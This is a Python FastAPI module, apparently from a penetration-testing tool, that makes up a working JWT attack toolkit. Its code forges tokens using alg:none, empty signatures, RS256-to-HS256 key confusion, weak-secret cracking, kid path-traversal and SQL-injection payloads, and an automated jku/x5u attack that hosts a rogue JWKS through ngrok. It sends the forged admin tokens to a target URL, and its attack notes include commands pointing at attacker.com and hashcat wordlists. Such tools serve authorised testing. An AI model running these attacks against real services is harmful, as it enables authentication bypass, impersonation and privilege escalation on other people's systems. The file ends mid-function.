"""
JWT attack toolkit — decode, forge, and test common JWT vulnerabilities.
"""
import base64
import hashlib
import hmac as _hmac
import json
import logging
import time
import uuid
import httpx
from fastapi import APIRouter
from fastapi.responses import JSONResponse
from pydantic import BaseModel
from typing import Optional

router = APIRouter(prefix="/api/jwt", tags=["jwt"])

# In-memory keypair store for jku/x5u attacks
_jwt_keypairs: dict[str, dict] = {}
logger = logging.getLogger(__name__)

# ── helpers ────────────────────────────────────────────────────────────────────

def _b64url_decode(s: str) -> bytes:
    s = s.replace("-", "+").replace("_", "/")
    s += "=" * (-len(s) % 4)
    return base64.b64decode(s)

def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def _decode_parts(token: str):
    parts = token.strip().split(".")
    if len(parts) != 3:
        raise ValueError("Not a JWT (expected 3 parts)")
    header = json.loads(_b64url_decode(parts[0]))
    try:
        payload = json.loads(_b64url_decode(parts[1]))
    except Exception:
        payload = {}
    return header, payload, parts

def _forge(header: dict, payload: dict, secret: bytes = b"") -> str:
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    msg = f"{h}.{p}".encode()
    alg = header.get("alg", "HS256").upper()
    if alg == "NONE":
        return f"{h}.{p}."
    if alg == "HS256":
        sig = _hmac.new(secret, msg, hashlib.sha256).digest()
    elif alg == "HS384":
        sig = _hmac.new(secret, msg, hashlib.sha384).digest()
    elif alg == "HS512":
        sig = _hmac.new(secret, msg, hashlib.sha512).digest()
    else:
        return f"{h}.{p}."
    return f"{h}.{p}.{_b64url_encode(sig)}"

def _bump_exp(payload: dict, hours: int = 876000) -> dict:
    p = dict(payload)
    p["exp"] = int(time.time()) + hours * 3600
    p["iat"] = int(time.time())
    if "nbf" in p:
        p["nbf"] = int(time.time()) - 10
    return p

async def _probe(url: str, token: str, header_name: str, extra_headers: dict) -> dict | None:
    if not url:
        return None
    hdr = {header_name: f"Bearer {token}", **extra_headers}
    raw_req = f"GET {url} HTTP/1.1\n"
    for k, v in hdr.items():
        raw_req += f"{k}: {v}\n"
    try:
        async with httpx.AsyncClient(verify=False, timeout=10, follow_redirects=True) as client:
            r = await client.get(url, headers=hdr)
            resp_lines = [f"HTTP/1.1 {r.status_code}"]
            for k, v in r.headers.items():
                resp_lines.append(f"{k}: {v}")
            resp_lines.append("")
            resp_lines.append(r.text[:3000])
            return {
                "status": r.status_code,
                "length": len(r.content),
                "interesting": r.status_code not in (401, 403),
                "raw_request": raw_req,
                "raw_response": "\n".join(resp_lines),
                "response_body": r.text[:3000],
            }
    except Exception as ex:
        return {"error": str(ex), "raw_request": raw_req}

# Attack metadata — used by frontend for explanations
ATTACK_META = {
    "alg_none": {
        "id": "alg_none",
        "name": "Algorithm None",
        "severity": "critical",
        "cve": "CVE-2015-9235",
        "description": (
            "If the server accepts `alg: none`, it skips signature verification entirely. "
            "An attacker can modify any claim (user ID, role, expiry) and the server will accept the token as valid."
        ),
        "how_it_works": (
            "JWT libraries that don't enforce a whitelist of allowed algorithms will accept "
            "'none' as a valid algorithm, treating the token as unsigned. "
            "Even capitalization variants like 'None', 'NONE', 'nOnE' bypass naive string checks."
        ),
        "steps": [
            "Decode the original JWT",
            "Change `alg` header to 'none' (try variants: None, NONE, nOnE)",
            "Modify payload claims if desired (role, admin, exp)",
            "Remove the signature (token ends with a dot)",
            "Send the modified token"
        ],
        "prerequisites": "None — works on any JWT regardless of original algorithm",
        "tools": "jwt_tool.py -X a, python-jwt, manual",
    },
    "empty_sig": {
        "id": "empty_sig",
        "name": "Empty Signature",
        "severity": "critical",
        "description": (
            "Some libraries distinguish between 'no signature' and 'empty signature'. "
            "Sending a token with an empty signature string (token ends with `.`) bypasses verification in some implementations."
        ),
        "how_it_works": (
            "The JWT spec requires the signature to be present but some buggy implementations "
            "accept an empty string as a valid signature, especially when `alg` is kept as the original."
        ),
        "steps": [
            "Take the original token header.payload",
            "Append a dot without any signature: header.payload.",
            "Optionally modify the payload first",
            "Send the token"
        ],
        "prerequisites": "None",
        "tools": "Manual construction",
    },
    "tampered_payload": {
        "id": "tampered_payload",
        "name": "Tampered Payload (original sig)",
        "severity": "high",
        "description": (
            "If the server doesn't verify the signature, you can modify the payload claims "
            "while keeping the original signature. Tests for missing or skipped verification."
        ),
        "how_it_works": (
            "Replace the payload section with a modified version (e.g., extended expiry, elevated role) "
            "while keeping the original header and signature. A properly implemented server will reject this, "
            "but misconfigured or development servers often don't check."
        ),
        "steps": [
            "Decode the original token",
            "Modify desired claims (admin, role, exp, sub)",
            "Re-encode only the payload part",
            "Keep original header and signature",
            "Assemble: original_header.new_payload.original_signature"
        ],
        "prerequisites": "None — but only works if server skips signature validation",
        "tools": "jwt_tool.py -I, manual",
    },
    "key_confusion": {
        "id": "key_confusion",
        "name": "RS256 → HS256 Key Confusion",
        "severity": "critical",
        "cve": "CVE-2016-10555",
        "description": (
            "When the server uses RS256 (asymmetric) and the public key is available, "
            "an attacker can sign a token with HS256 using the public key as the HMAC secret. "
            "Vulnerable libraries that don't check the expected algorithm will accept it."
        ),
        "how_it_works": (
            "The server's public key is, by definition, public. If the JWT library uses the 'alg' from the token "
            "header instead of enforcing the expected algorithm, it will try to verify the HS256 token using the "
            "public key as the HMAC secret — which is exactly what the attacker signed with."
        ),
        "steps": [
            "Obtain the server's RSA public key (from /jwks.json, /.well-known/openid-configuration, or SSL cert)",
            "Change `alg` from RS256 to HS256",
            "Modify payload claims as desired",
            "Sign the token with HMAC-SHA256 using the public key bytes as the secret",
            "Send the forged token"
        ],
        "prerequisites": "Target uses RS256 or ES256; public key must be obtainable",
        "tools": "jwt_tool.py -X k -pk public.pem, python3 with pyjwt",
        "command": "python3 -c \"import jwt; print(jwt.encode(payload, open('public.pem','rb').read(), algorithm='HS256'))\"",
    },
    "weak_secret": {
        "id": "weak_secret",
        "name": "Weak Secret Brute Force",
        "severity": "critical",
        "description": (
            "HMAC-based JWTs (HS256/384/512) are only as secure as their secret key. "
            "If the secret is weak, short, or common, it can be brute-forced offline without any server interaction."
        ),
        "how_it_works": (
            "The JWT signature is HMAC(header.payload, secret). An attacker with the token can try "
            "candidate secrets locally and check if the resulting signature matches. "
            "Once cracked, the attacker can sign arbitrary tokens."
        ),
        "steps": [
            "Extract the JWT from a request",
            "Run offline brute force against common/weak secrets",
            "If cracked: re-sign any payload with the discovered secret",
            "Elevate privileges, impersonate other users, or extend expiry"
        ],
        "prerequisites": "Token uses HS256, HS384, or HS512",
        "tools": "hashcat -a 0 -m 16500 token.txt wordlist.txt, john --format=HMAC-SHA256, jwt_tool.py -C -d wordlist.txt",
        "command": "hashcat -a 0 -m 16500 <token> /usr/share/wordlists/rockyou.txt",
    },
    "kid_injection": {
        "id": "kid_injection",
        "name": "kid Header Injection",
        "severity": "high",
        "description": (
            "The `kid` (Key ID) header tells the server which key to use for verification. "
            "If the server uses `kid` in a file path or SQL query without sanitization, "
            "it's vulnerable to path traversal or SQL injection."
        ),
        "how_it_works": (
            "Path traversal: Set kid to '../../dev/null' and sign with an empty/null secret — "
            "the server reads /dev/null (empty file) as the key, accepting an empty HMAC. "
            "SQL injection: Set kid to \"' OR '1'='1\" to make the key lookup return any key."
        ),
        "steps": [
            "Check if the original token has a `kid` header",
            "Try path traversal: kid = '../../dev/null', sign with empty secret (or 32 null bytes)",
            "Try SQL injection: kid = \"' OR '1'='1\", sign with empty secret",
            "Try directory traversal variants: '../../../../../../../dev/null'",
            "Send forged token and observe server behavior"
        ],
        "prerequisites": "Token has `kid` header; server uses it unsafely",
        "tools": "jwt_tool.py -I -hc kid -hv '../../dev/null' -S hs256 -p ''",
    },
    "jku_ssrf": {
        "id": "jku_ssrf",
        "name": "jku / x5u SSRF",
        "severity": "high",
        "cve": "CVE-2018-0114",
        "description": (
            "The `jku` (JWK Set URL) and `x5u` (X.509 URL) headers tell the server where to fetch the signing key. "
            "If the server fetches the URL from the token without validation, it's vulnerable to SSRF "
            "and the attacker can host their own key to sign arbitrary tokens."
        ),
        "how_it_works": (
            "1. Generate your own RSA key pair. "
            "2. Host your public key as a JWKS endpoint. "
            "3. Add 'jku' header pointing to your endpoint. "
            "4. Sign the token with your private key. "
            "The server fetches your public key and verifies successfully."
        ),
        "steps": [
            "Generate RSA key pair: openssl genrsa -out attacker.pem 2048",
            "Extract public key: openssl rsa -in attacker.pem -pubout -out attacker_pub.pem",
            "Convert to JWKS format and host on your server",
            "Forge token with jku pointing to your JWKS URL",
            "Sign with your private key",
            "Send the token"
        ],
        "prerequisites": "Server fetches `jku`/`x5u` without URL whitelist",
        "tools": "jwt_tool.py --exploit jku --jwks-url https://your-server/jwks.json",
        "command": "jwt_tool.py <token> --exploit jku --jwks-url https://attacker.com/jwks.json -I -pc sub -pv admin",
    },
    "priv_esc": {
        "id": "priv_esc",
        "name": "Privilege Escalation Claims",
        "severity": "high",
        "description": (
            "Add or modify authorization claims (admin, role, scope, permissions) combined with alg:none "
            "or a cracked secret to gain elevated access."
        ),
        "how_it_works": (
            "Once signature verification is bypassed (via alg:none, key confusion, etc.), "
            "the attacker can set any claim. Common targets: admin=true, role=admin, "
            "scope=admin, permissions=[\"*\"], isAdmin=1."
        ),
        "steps": [
            "First bypass signature verification (use alg:none or crack the secret)",
            "Add privilege claims to the payload",
            "Send the modified token to privileged endpoints",
            "Try: /admin, /api/admin, /dashboard/admin, /users"
        ],
        "prerequisites": "Signature verification must already be bypassable",
        "tools": "Combined with alg:none or weak_secret attacks",
    },
    "expired_reuse": {
        "id": "expired_reuse",
        "name": "Expired Token Reuse",
        "severity": "medium",
        "description": (
            "Some servers don't validate the `exp` (expiration) claim, accepting expired tokens indefinitely. "
            "This is especially common in internal APIs and microservices."
        ),
        "how_it_works": (
            "Send the original token even after it should have expired. "
            "If the server responds normally, it's not checking expiration."
        ),
        "steps": [
            "Capture a JWT from any response",
            "Wait for it to expire (or check the exp claim)",
            "Resend the original token to the API",
            "If you get 200 OK instead of 401, the server doesn't validate expiry"
        ],
        "prerequisites": "Have an expired (or soon-to-expire) token",
        "tools": "curl, Burp Suite Repeater",
    },
    "null_token": {
        "id": "null_token",
        "name": "Null / Malformed Token Handling",
        "severity": "medium",
        "description": (
            "Test how the server handles malformed, null, or unexpected token values. "
            "Some servers crash, leak info, or grant access on unexpected inputs."
        ),
        "how_it_works": (
            "Some authentication middleware grants access on null/empty tokens (fails open), "
            "while others may throw exceptions that reveal internal paths or grant unintended access."
        ),
        "steps": [
            "Try: Authorization: Bearer null",
            "Try: Authorization: Bearer undefined",
            "Try: Authorization: Bearer []",
            "Try: Authorization: Bearer {}",
            "Try: omitting the Authorization header entirely",
            "Try: Authorization: Bearer <empty string>"
        ],
        "prerequisites": "None",
        "tools": "curl, Burp Suite",
    },
}

# ── models ────────────────────────────────────────────────────────────────────

class DecodeRequest(BaseModel):
    token: str

class ProbeRequest(BaseModel):
    token: str
    url: str
    header_name: str = "Authorization"
    extra_headers: dict = {}

class SingleAttackRequest(BaseModel):
    token: str
    attack_id: str
    target_url: str = ""
    header_name: str = "Authorization"
    extra_headers: dict = {}
    wordlist: list[str] = []
    # For key_confusion: provide the public key
    public_key: str = ""

class AttackRequest(BaseModel):
    token: str
    target_url: str = ""
    header_name: str = "Authorization"
    extra_headers: dict = {}
    wordlist: list[str] = []
    public_key: str = ""

class RequestScanRequest(BaseModel):
    # Full HTTP flow from proxy
    raw_request: str = ""           # raw HTTP text, OR use the fields below
    method: str = "GET"
    url: str = ""
    headers: dict = {}
    body: str = ""
    use_https: bool = True
    # Attack options
    attack_id: str = ""             # empty = run all applicable
    wordlist: list[str] = []
    public_key: str = ""

# ── endpoints ────────────────────────────────────────────────────────────────

@router.get("/attack-meta")
async def get_attack_meta():
    """Return metadata for all attacks (descriptions, steps, etc.)"""
    return {"attacks": list(ATTACK_META.values())}


# ── RSA keypair generation and JWKS hosting ───────────────────────────────────

def _int_to_b64url(n: int) -> str:
    byte_length = (n.bit_length() + 7) // 8
    b = n.to_bytes(byte_length, "big")
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


@router.post("/generate-keypair")
async def generate_keypair():
    """Generate RSA keypair for jku/x5u attack. Stores in memory and serves via /jwks/{kid}."""
    try:
        from cryptography.hazmat.primitives.asymmetric import rsa, padding
        from cryptography.hazmat.primitives import serialization, hashes
    except ImportError:
        return {"error": "cryptography package not available"}

    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()

    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption(),
    ).decode()

    public_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    ).decode()

    pub_numbers = public_key.public_numbers()
    kid = str(uuid.uuid4())[:8]

    jwks = {
        "keys": [{
            "kty": "RSA", "kid": kid, "use": "sig", "alg": "RS256",
            "n": _int_to_b64url(pub_numbers.n),
            "e": _int_to_b64url(pub_numbers.e),
        }]
    }

    _jwt_keypairs[kid] = {
        "private_pem": private_pem,
        "public_pem": public_pem,
        "jwks": jwks,
        "kid": kid,
    }

    return {"kid": kid, "private_pem": private_pem, "public_pem": public_pem}


@router.get("/jwks/{kid}")
async def serve_jwks(kid: str):
    """Serve JWKS — called by the target server when validating a jku token."""
    kp = _jwt_keypairs.get(kid)
    if not kp:
        return JSONResponse({"keys": []}, status_code=404)
    logger.info(f"[jku] JWKS fetched for kid={kid} — target server validated our forged token!")
    return kp["jwks"]


def _sign_rs256(header: dict, payload: dict, private_pem: str) -> str:
    from cryptography.hazmat.primitives import serialization, hashes
    from cryptography.hazmat.primitives.asymmetric import padding as _padding
    from cryptography.hazmat.backends import default_backend

    private_key = serialization.load_pem_private_key(private_pem.encode(), password=None, backend=default_backend())
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    msg = f"{h}.{p}".encode()
    sig = private_key.sign(msg, _padding.PKCS1v15(), hashes.SHA256())
    return f"{h}.{p}.{_b64url_encode(sig)}"


@router.post("/jku-attack")
async def jku_attack(req: SingleAttackRequest):
    """
    Fully automated jku/x5u SSRF attack:
    1. Generates RSA keypair
    2. Hosts JWKS at /api/jwt/jwks/<kid>
    3. If target is external: starts ngrok tunnel automatically
    4. Signs forged token with RS256 pointing jku to our JWKS URL
    5. Probes target (target server should fetch JWKS from us)
    """
    from nexhunt.services.ngrok_manager import get_tunnel_url, _is_external
    from nexhunt.config import settings as _cfg

    ngrok_url = ""
    ngrok_error = ""
    tunnel_needed = req.target_url and _is_external(req.target_url)

    if tunnel_needed:
        ngrok_url, ngrok_error = await get_tunnel_url(17707)

    if ngrok_url:
        attacker_base = ngrok_url.rstrip("/")
    else:
        attacker_base = f"http://127.0.0.1:17707"

    try:
        header, payload, _ = _decode_parts(req.token)
    except Exception as e:
        return {"error": str(e)}

    # Generate keypair
    kp_res = await generate_keypair()
    if "error" in kp_res:
        return kp_res
    kid = kp_res["kid"]
    private_pem = kp_res["private_pem"]

    jwks_url = f"{attacker_base}/api/jwt/jwks/{kid}"
    tokens = []

    for header_field in ["jku", "x5u"]:
        for admin_claim in [
            {},
            {"admin": True},
            {"role": "admin"},
            {"sub": "admin"},
        ]:
            forged_header = {**header, "alg": "RS256", header_field: jwks_url, "kid": kid}
            forged_payload = _bump_exp({**payload, **admin_claim})
            try:
                tok = _sign_rs256(forged_header, forged_payload, private_pem)
                label = f"{header_field} → {jwks_url}"
                if admin_claim:
                    label += f" + {admin_claim}"
                tokens.append({"label": label, "token": tok, "header_field": header_field})
            except Exception as ex:
                tokens.append({"label": f"{header_field} (sign failed: {ex})", "token": None})

    # Probe each token
    probes = []
    for t in tokens:
        probe_result = await _probe(req.target_url, t["token"], req.header_name or "Authorization", req.extra_headers) if t["token"] else None
        probes.append({**t, "probe": probe_result})

    note = f"Target server should fetch JWKS from: {jwks_url}\nIf a probe returns non-401/403, the attack worked."
    if ngrok_url:
        note = f"Ngrok tunnel active: {ngrok_url}\nJWKS hosted at: {jwks_url}\n\nThe forged token's jku/x5u points to this public URL. When the target fetches it, it will use your RSA key — granting access."
    elif ngrok_error:
        note = f"Target appears external but ngrok failed: {ngrok_error}\n\nJWKS hosted locally at: {jwks_url}\nThis will only work if the target can reach your machine directly."

    return {
        "kid": kid,
        "jwks_url": jwks_url,
        "ngrok_url": ngrok_url,
        "ngrok_error": ngrok_error,
        "tunnel_needed": tunnel_needed,
        "tokens": [t for t in tokens if t["token"]],
        "probes": probes,
        "note": note,
    }


@router.post("/decode")
async def decode_jwt(req: DecodeRequest):
    try:
        header, payload, parts = _decode_parts(req.token)
        sig_b64 = parts[2]
        issues = []
        if header.get("alg", "").upper() in ("NONE", ""):
            issues.append({"level": "critical", "msg": "Algorithm is 'none' — no signature verification"})
        if header.get("alg", "").startswith("HS") and len(sig_b64) < 20:
            issues.append({"level": "high", "msg": "Signature looks very short — possible weak secret"})
        if payload.get("exp") and payload["exp"] < time.time():
            issues.append({"level": "medium", "msg": f"Token expired at {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(payload['exp']))}"})
        if "kid" in header:
            issues.append({"level": "high", "msg": f"kid header present: '{header['kid']}' — test for injection"})
        if "jku" in header or "x5u" in header:
            issues.append({"level": "critical", "msg": "jku/x5u header present — possible SSRF"})
        if header.get("alg", "").startswith("RS") or header.get("alg", "").startswith("ES"):
            issues.append({"level": "high", "msg": f"Asymmetric alg ({header['alg']}) — test RS256→HS256 key confusion"})
        return {
            "header": header,
            "payload": payload,
            "signature": sig_b64,
            "algorithm": header.get("alg", "?"),
            "is_expired": payload.get("exp", 0) < time.time() if "exp" in payload else None,
            "exp_date": time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(payload["exp"])) if "exp" in payload else None,
            "issues": issues,
            "applicable_attacks": _get_applicable_attacks(header, payload),
        }
    except Exception as e:
        return {"error": str(e)}


def _get_applicable_attacks(header: dict, payload: dict) -> list[str]:
    alg = header.get("alg", "").upper()
    attacks = ["alg_none", "empty_sig", "tampered_payload", "expired_reuse", "null_token", "priv_esc"]
    if alg.startswith("HS"):
        attacks.append("weak_secret")
    if alg.startswith("RS") or alg.startswith("ES"):
        attacks.append("key_confusion")
    if "kid" in header:
        attacks.append("kid_injection")
    attacks.append("jku_ssrf")
    return attacks


@router.post("/probe")
async def probe_token(req: ProbeRequest):
    """Probe a single token against a URL."""
    result = await _probe(req.url, req.token, req.header_name, req.extra_headers)
    return result or {"error": "No URL provided"}


@router.post("/single-attack")
async def single_attack(req: SingleAttackRequest):
    """Run one specific attack and return the forged token + probe result."""
    try:
        header, payload, parts = _decode_parts(req.token)
    except Exception as e:
        return {"error": str(e)}

    original_sig = parts[2]
    alg = header.get("alg", "HS256")

    tokens = []  # list of {label, token}

    # ── alg:none ──────────────────────────────────────────────────────────────
    if req.attack_id == "alg_none":
        for none_val in ["none", "None", "NONE", "nOnE"]:
            h = {**header, "alg": none_val}
            p = _bump_exp(payload)
            tokens.append({"label": f"alg:{none_val}", "token": _forge(h, p)})

    # ── empty sig ─────────────────────────────────────────────────────────────
    elif req.attack_id == "empty_sig":
        tokens.append({"label": "empty signature", "token": f"{parts[0]}.{parts[1]}."})

    # ── tampered payload ──────────────────────────────────────────────────────
    elif req.attack_id == "tampered_payload":
        p_new = _bump_exp(payload)
        p_enc = _b64url_encode(json.dumps(p_new, separators=(",", ":")).encode())
        tokens.append({"label": "extended exp (original sig)", "token": f"{parts[0]}.{p_enc}.{original_sig}"})
        # Also try with admin claims
        for claim in [{"admin": True}, {"role": "admin"}, {"isAdmin": True}]:
            p_claim = _bump_exp({**payload, **claim})
            p_enc2 = _b64url_encode(json.dumps(p_claim, separators=(",", ":")).encode())
            tokens.append({"label": f"{claim} (original sig)", "token": f"{parts[0]}.{p_enc2}.{original_sig}"})

    # ── key confusion ─────────────────────────────────────────────────────────
    elif req.attack_id == "key_confusion":
        if req.public_key:
            try:
                h = {**header, "alg": "HS256"}
                p = _bump_exp(payload)
                token = _forge(h, p, req.public_key.encode())
                tokens.append({"label": "RS256→HS256 with provided public key", "token": token})
            except Exception as ex:
                return {"error": f"Key confusion failed: {ex}"}
        else:
            return {
                "error": None,
                "tokens": [],
                "manual": True,
                "instructions": (
                    "Provide the server's public key above to forge a HS256 token. "
                    "Get it from: /jwks.json, /.well-known/openid-configuration, or extract from SSL cert.\n\n"
                    "Command:\n"
                    "python3 -c \"import jwt; print(jwt.encode(payload, open('public.pem','rb').read(), algorithm='HS256'))\""
                )
            }

    # ── weak secret ──────────────────────────────────────────────────────────
    elif req.attack_id == "weak_secret":
        weak_secrets = req.wordlist or [
            "secret", "password", "123456", "qwerty", "admin",
            "jwt_secret", "your-256-bit-secret", "supersecret",
            "mysecret", "test", "key", "private", "changeme",
            "secret123", "jwt", "token", "hs256", "app_secret",
            "", "null", "undefined", "pass", "1234", "letmein",
            "welcome", "monkey", "dragon", "master", "abc123",
        ]
        cracked = None
        for secret in weak_secrets[:500]:
            h_b = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
            p_b = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
            msg = f"{h_b}.{p_b}".encode()
            if alg.upper() == "HS384":
                expected = _b64url_encode(_hmac.new(secret.encode(), msg, hashlib.sha384).digest())
            elif alg.upper() == "HS512":
                expected = _b64url_encode(_hmac.new(secret.encode(), msg, hashlib.sha512).digest())
            else:
                expected = _b64url_encode(_hmac.new(secret.encode(), msg, hashlib.sha256).digest())
            if expected == original_sig:
                cracked = secret
                break
        if cracked is not None:
            p_forged = _bump_exp(payload)
            token_forged = _forge(header, p_forged, cracked.encode())
            # Also forge with admin
            p_admin = _bump_exp({**payload, "admin": True, "role": "admin"})
            token_admin = _forge(header, p_admin, cracked.encode())
            tokens.append({"label": f"cracked secret='{cracked}' — extended exp", "token": token_forged})
            tokens.append({"label": f"cracked secret='{cracked}' — admin escalation", "token": token_admin})
            return {
                "cracked": True,
                "secret": cracked,
                "tokens": tokens,
                "probes": [{"label": t["label"], "token": t["token"],
                            "probe": await _probe(req.target_url, t["token"], req.header_name, req.extra_headers)}
                           for t in tokens],
            }
        else:
            return {
                "cracked": False,
                "tokens": [],
                "message": f"Tested {min(len(weak_secrets), 500)} secrets — none matched.",
                "next": "Try hashcat with rockyou.txt: hashcat -a 0 -m 16500 <token> /usr/share/wordlists/rockyou.txt",
            }

    # ── kid injection ─────────────────────────────────────────────────────────
    elif req.attack_id == "kid_injection":
        if "kid" not in header:
            return {"error": "Token has no 'kid' header — attack not applicable"}
        payloads_kid = [
            ("path-traversal", "../../../dev/null", b"\x00" * 32),
            ("path-traversal-2", "../../../../../../dev/null", b"\x00" * 32),
            ("sqli-or", "' OR '1'='1", b""),
            ("sqli-or-2", "' OR 1=1--", b""),
            ("sqli-union", "' UNION SELECT 'secret'--", b"secret"),
            ("empty-kid", "", b""),
        ]
        for label, kid_val, secret in payloads_kid:
            h_kid = {**header, "alg": "HS256", "kid": kid_val}
            p_kid = _bump_exp(payload)
            tokens.append({"label": f"kid={kid_val[:30]!r} ({label})", "token": _forge(h_kid, p_kid, secret)})

    # ── jku ssrf ──────────────────────────────────────────────────────────────
    elif req.attack_id == "jku_ssrf":
        # Fully automated — use the dedicated endpoint
        result = await jku_attack(req)
        return result

    # ── priv esc ──────────────────────────────────────────────────────────────
    elif req.attack_id == "priv_esc":
        claims_list = [
            {"admin": True},
            {"role": "admin"},
            {"isAdmin": True},
            {"is_admin": 1},
            {"user": "admin"},
            {"sub": "admin"},
            {"scope": "admin read write delete"},
            {"permissions": ["admin", "read", "write", "delete"]},
            {"groups": ["admins", "superusers"]},
        ]
        for claim in claims_list:
            h_none = {**header, "alg": "none"}
            p_priv = _bump_exp({**payload, **claim})
            tokens.append({"label": f"{list(claim.keys())[0]}={list(claim.values())[0]} (alg:none)", "token": _forge(h_none, p_priv)})

    # ── expired reuse ─────────────────────────────────────────────────────────
    elif req.attack_id == "expired_reuse":
        tokens.append({"label": "original token (as-is)", "token": req.token})

    # ── null token ────────────────────────────────────────────────────────────
    elif req.attack_id == "null_token":
        null_values = ["null", "undefined", "[]", "{}", "none", "0", "false", ""]
        for val in null_values:
            tokens.append({"label": f"Bearer {val!r}", "token": val})

    else:
        return {"error": f"Unknown attack_id: {req.attack_id}"}

    # Probe all tokens
    probes = []
    for t in tokens:
        probe_result = await _probe(req.target_url, t["token"], req.header_name, req.extra_headers)
        probes.append({**t, "probe": probe_result})

    return {"tokens": tokens, "probes": probes}


@router.post("/attacks")
async def run_all_attacks(req: AttackRequest):
    """Run a summary of all attacks (fast — no probing each one). Returns forged tokens."""
    try:
        header, payload, parts = _decode_parts(req.token)
    except Exception as e:
        return {"error": str(e)}

    applicable = _get_applicable_attacks(header, payload)
    return {
        "applicable_attacks": applicable,
        "total": len(applicable),
        "token_info": {
            "alg": header.get("alg"),
            "has_kid": "kid" in header,
            "has_jku": "jku" in header or "x5u" in header,
            "is_expired": payload.get("exp", 0) < time.time() if "exp" in payload else None,
        }
    }


# ── Request-based detection & attack ─────────────────────────────────────────

import re as _re

JWT_PATTERN = _re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')


def _find_jwt_in_request(headers: dict, body: str, url: str) -> list[dict]:
    """
    Find all JWTs in a request and return their location info.
    Returns list of {token, location, header_name, cookie_name, replace_fn}
    """
    found = []

    # 1. Check Authorization header
    for name, value in headers.items():
        if name.lower() == 'authorization':
            m = JWT_PATTERN.search(str(value))
            if m:
                found.append({
                    "token": m.group(0),
                    "location": "header",
                    "header_name": name,
                    "cookie_name": None,
                    "param_name": None,
                    "original_value": value,
                })
        # Other common auth headers
        elif name.lower() in ('x-auth-token', 'x-access-token', 'x-jwt-token', 'x-token', 'token'):
            m = JWT_PATTERN.search(str(value))
            if m:
                found.append({
                    "token": m.group(0),
                    "location": "header",
                    "header_name": name,
                    "cookie_name": None,
                    "param_name": None,
                    "original_value": value,
                })

    # 2. Check Cookie header
    cookie_hdr = next((v for k, v in headers.items() if k.lower() == 'cookie'), '')
    if cookie_hdr:
        for cookie_pair in cookie_hdr.split(';'):
            cookie_pair = cookie_pair.strip()
            if '=' in cookie_pair:
                cname, cval = cookie_pair.split('=', 1)
                m = JWT_PATTERN.search(cval)
                if m:
                    found.append({
                        "token": m.group(0),
                        "location": "cookie",
                        "header_name": "Cookie",
                        "cookie_name": cname.strip(),
                        "param_name": None,
                        "original_value": cval,
                    })

    # 3. Check URL query parameters
    if '?' in url:
        query = url.split('?', 1)[1]
        for param in query.split('&'):
            if '=' in param:
                pname, pval = param.split('=', 1)
                m = JWT_PATTERN.search(pval)
                if m:
                    found.append({
                        "token": m.group(0),
                        "location": "query",
                        "header_name": None,
                        "cookie_name": None,
                        "param_name": pname,
                        "original_value": pval,
                    })

    # 4. Check request body
    if body:
        # JSON body
        try:
            body_json = json.loads(body)
            for key in ('token', 'jwt', 'access_token', 'id_token', 'auth_token', 'bearer'):
                if key in body_json:
                    m = JWT_PATTERN.search(str(body_json[key]))
                    if m:
                        found.append({
                            "token": m.group(0),
                            "location": "body_json",
                            "header_name": None,
                            "cookie_name": None,
                            "param_name": key,
                            "original_value": str(body_json[key]),
                        })
        except Exception:
            pass
        # Raw body scan
        for m in JWT_PATTERN.finditer(body):
            tok = m.group(0)
            if not any(f["token"] == tok for f in found):
                found.append({
                    "token": tok,
                    "location": "body",
                    "header_name": None,
                    "cookie_name": None,
                    "param_name": None,
                    "original_value": tok,
                })

    return found


def _replace_token_in_request(headers: dict, body: str, url: str, jwt_info: dict, new_token: str) -> tuple[dict, str, str]:
    """Replace the JWT in the request with new_token. Returns (new_headers, new_body, new_url)."""
    new_headers = dict(headers)
    new_body = body
    new_url = url
    old_token = jwt_info["token"]
    loc = jwt_info["location"]

    if loc == "header":
        hname = jwt_info["header_name"]
        orig = new_headers.get(hname, "")
        new_headers[hname] = orig.replace(old_token, new_token)

    elif loc == "cookie":
        cookie_hdr = new_headers.get("Cookie", new_headers.get("cookie", ""))
        new_headers["Cookie"] = cookie_hdr.replace(old_token, new_token)

    elif loc == "query":
        new_url = url.replace(old_token, new_token)

    elif loc in ("body", "body_json"):
        new_body = body.replace(old_token, new_token)

    return new_headers, new_body, new_url


async def _send_request(method: str, url: str, headers: dict, body: str, use_https: bool) -> dict:
    # Build raw request string for display
    raw_req_lines = [f"{method} {url} HTTP/1.1"]
    for k, v in headers.items():
        raw_req_lines.append(f"{k}: {v}")
    if body:
        raw_req_lines.append("")
        raw_req_lines.append(body[:500])
    raw_request = "\n".join(raw_req_lines)

    try:
        async with httpx.AsyncClient(verify=False, timeout=15, follow_redirects=True) as client:
            r = await client.request(
                method=method,
                url=url,
                headers=headers,
                content=body.encode() if body else None,
            )
            # Build raw response string
            resp_lines = [f"HTTP/1.1 {r.status_code}"]
            for k, v in r.headers.items():
                resp_lines.append(f"{k}: {v}")
            resp_lines.append("")
            body_text = r.text[:3000]
            resp_lines.append(body_text)

            return {
                "status": r.status_code,
                "length": len(r.content),
                "interesting": r.status_code not in (401, 403),
                "raw_request": raw_request,
                "raw_response": "\n".join(resp_lines),
                "response_body": body_text,
            }
    except Exception as ex:
        return {"error": str(ex), "raw_request": raw_request}


@router.post("/detect")
async def detect_jwt_in_request(req: RequestScanRequest):
    """Detect all JWTs present in a request and return their locations."""
    found = _find_jwt_in_request(req.headers, req.body, req.url)
    result = []
    for info in found:
        try:
            header, payload, _ = _decode_parts(info["token"])
            info["decoded"] = {
                "algorithm": header.get("alg"),
                "header": header,
